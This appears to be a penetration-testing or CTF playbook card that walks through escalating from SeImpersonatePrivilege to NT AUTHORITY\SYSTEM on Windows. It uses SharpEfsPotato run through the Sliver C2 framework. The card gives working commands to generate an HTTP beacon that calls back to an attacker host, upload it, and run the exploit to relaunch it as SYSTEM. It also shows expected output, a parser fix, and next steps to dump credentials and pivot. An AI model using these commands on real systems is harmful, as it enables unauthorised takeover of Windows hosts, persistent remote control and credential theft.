title: SharpEfsPotato via Sliver — SeImpersonate → SYSTEM
body: SeImpersonatePrivilege confirmed? SharpEfsPotato via EfsRpc is one of the cleanest token impersonation paths to SYSTEM. Running it through Sliver's execute-assembly has a critical gotcha: the -- separator is required before any flag-style arguments (-p, -a) or Sliver's CLI parser swallows them and you get a fork/exec syntax error. The technique itself works — the EFS trigger fires, token duplicates, and a new beacon checks in as WORKGROUP\MACHINE$ (NT AUTHORITY\SYSTEM).
cmd:
# ── PREREQUISITE CHECK ───────────────────────────────
# Confirm SeImpersonatePrivilege is present (Disabled is fine — tools activate it)
sa-whoami
# Or via shell:
whoami /priv | findstr SeImpersonate
# Should show: SeImpersonatePrivilege  Impersonate...  Enabled/Disabled

# ── STAGE THE BEACON ─────────────────────────────────
# Generate a beacon on Kali and upload to target
# In Sliver console:
generate beacon --http $lhost --os windows --arch amd64 --skip-symbols -N http_beacon
# Upload to target:
upload /home/kali/http_beacon.exe C:\\Users\\user\\http_beacon.exe

# ── THE CRITICAL SYNTAX FIX ──────────────────────────
# WRONG — Sliver's Cobra parser swallows -p as its own flag:
execute-assembly SharpEfsPotato.exe --arguments "-p C:\\path\\beacon.exe"
# Error: fork/exec  C:\path\beacon.exe: filename/directory syntax incorrect
#        (note the leading space — Sliver mangled the path)

# CORRECT — use -- to tell Sliver "stop parsing here":
execute-assembly /home/kali/hacktrack/c2_sliver/precompiled-binaries/PrivilegeEscalation/Token/SharpEfsPotato.exe -- -p C:\\Users\\user\\http_beacon.exe

# ── FULL COMMAND ─────────────────────────────────────
execute-assembly /home/kali/hacktrack/c2_sliver/precompiled-binaries/PrivilegeEscalation/Token/SharpEfsPotato.exe -- -p C:\\Users\\luiza\\http_beacon.exe

# ── EXPECTED OUTPUT ───────────────────────────────────
# [+] Triggering name pipe access on evil PIPE ...
# [x] RpcBindingSetAuthInfo failed with status 0x6d3  ← normal, ignore
# [+] Server connected to our evil RPC pipe
# [+] Duplicated impersonation token ready for process creation
# [+] Intercepted and authenticated successfully, launching program
# [+] Process created, enjoy!
# [*] Beacon XXXXXXXX http_beacon - x.x.x.x (hostname) - windows/amd64

# ── VERIFY NEW BEACON ─────────────────────────────────
beacons
# Look for: Username = WORKGROUP\HOSTNAME$  (machine account = SYSTEM)
# use <new_beacon_id>
sa-whoami
# SID S-1-5-18 = NT AUTHORITY\SYSTEM
# Mandatory Label\System Mandatory Level

# ── SHARPEFSPOTATO FLAGS ──────────────────────────────
# -p  Program to launch (default: cmd.exe — if omitted, spawns cmd silently)
# -a  Arguments to pass to that program
# Example with -a:
execute-assembly SharpEfsPotato.exe -- -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\Windows\\Temp\\out.txt"
warn: The -- separator is mandatory when passing flag-style args (-p, -a) to execute-assembly. Without it, Sliver's argument parser treats -p as its own flag and the path gets mangled with a leading space. Without any args, SharpEfsPotato defaults to launching cmd.exe — process creates successfully but no beacon checks in. This technique requires SeImpersonatePrivilege (present even if Disabled) — common on IIS, service accounts, SQL Server processes.

choices.label: Got SYSTEM beacon — dump creds / loot
Got SYSTEM — grab proof and pivot
